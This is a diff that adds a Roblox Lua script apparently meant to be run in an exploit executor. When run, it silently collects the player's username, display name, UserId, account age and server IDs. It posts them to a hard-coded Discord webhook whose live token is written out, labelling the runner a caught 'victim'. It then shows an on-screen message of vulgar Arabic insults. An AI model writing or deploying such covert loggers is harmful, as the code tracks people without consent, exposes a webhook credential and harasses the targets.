@@ -1,1 +1,88 @@
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
 
+-- حساب عمر الحساب بالأيام تقريباً
+local accountAgeDays = player.AccountAge
+local username = player.Name
+local displayName = player.DisplayName
+local userId = player.UserId
+local jobId = game.JobId ~= "" and game.JobId or "Main Server/Private"
+local placeId = game.PlaceId
+local profileUrl = "https://www.roblox.com/users/" .. userId .. "/profile"
+
+-- تجهيز البيانات لإرسالها بتنسيق مرتب (Embed) عبر الويب هوك
+local data = {
+    ["embeds"] = {
+        {
+            ["title"] = "🚨 تم صيد ضحية جديدة!",
+            ["color"] = 16711680, -- لون أحمر
+            ["fields"] = {
+                { ["name"] = "👤 اسم المستخدم", ["value"] = "```" .. username .. "```", ["inline"] = true },
+                { ["name"] = "🏷️ الاسم الظاهر", ["value"] = "```" .. displayName .. "```", ["inline"] = true },
+                { ["name"] = "🆔 الأيدي (UserId)", ["value"] = "```" .. tostring(userId) .. "```", ["inline"] = true },
+                { ["name"] = "📅 عمر الحساب", ["value"] = "```" .. accountAgeDays .. " يوم```", ["inline"] = true },
+                { ["name"] = "🌐 رابط الحساب", ["value"] = "[اضغط هنا لفتح البروفايل](" .. profileUrl .. ")", ["inline"] = false },
+                { ["name"] = "🌍 معرّف السيرفر (JobId)", ["value"] = "```" .. jobId .. "```", ["inline"] = false },
+                { ["name"] = "🎮 معرّف اللعبة (PlaceId)", ["value"] = "```" .. tostring(placeId) .. "```", ["inline"] = true }
+            },
+            ["footer"] = {
+                ["text"] = "Anti-Scam Logger"
+            },
+            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }
+    }
+}
+
+local encodedData = HttpService:JSONEncode(data)
+
+-- رابط الويب هوك الخاص بك
+local webhookUrl = "https://discord.com/api/webhooks/1554869958788255744/FUBoZaU9QRcXASVvcEfpUvEPfvA71btLuIK3axMwaFdpN6K_b_fDTEEAqcVynSoLj85S"
+
+-- إرسال الطلب عبر الويب هوك (يتطلب محاكي يدعم HttpPost مثل Synapse Z أو Arceus X)
+local success, errorMessage = pcall(function()
+    request({
+        Url = webhookUrl,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = encodedData
+    })
+end)
+
+if not success then
+    -- محاولة بديلة في حال لم تكن دالة request مدعومة بالكامل
+    pcall(function()
+        HttpService:PostAsync(webhookUrl, encodedData)
+    end)
+end
+
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- إزالة أي واجهة قديمة لنفس السكربت إن وجدت
+if playerGui:FindFirstChild("AntiScamGui") then
+    playerGui.AntiScamGui:Destroy()
+end
+
+-- إنشاء الشاشة الرئيسية
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "AntiScamGui"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = playerGui
+
+-- إنشاء النص وتوسيطه في الشاشة
+local textLabel = Instance.new("TextLabel")
+textLabel.Name = "WarningText"
+textLabel.Size = UDim2.new(0, 600, 0, 100)
+textLabel.Position = UDim2.new(0.5, -300, 0.4, -50) -- في منتصف الشاشة تماماً
+textLabel.BackgroundTransparency = 1
+textLabel.Font = Enum.Font.FredokaOne
+textLabel.Text = " تبي تسرقني يا سبك ؟ كس امك ياقحبه"
+textLabel.TextColor3 = Color3.fromRGB(255, 50, 50) -- لون أحمر لافت للنظر
+textLabel.TextScaled = true
+textLabel.TextStrokeTransparency = 0 -- إضافة حدود سوداء للنص ليصبح واضحاً
+textLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+textLabel.Parent = screenGui
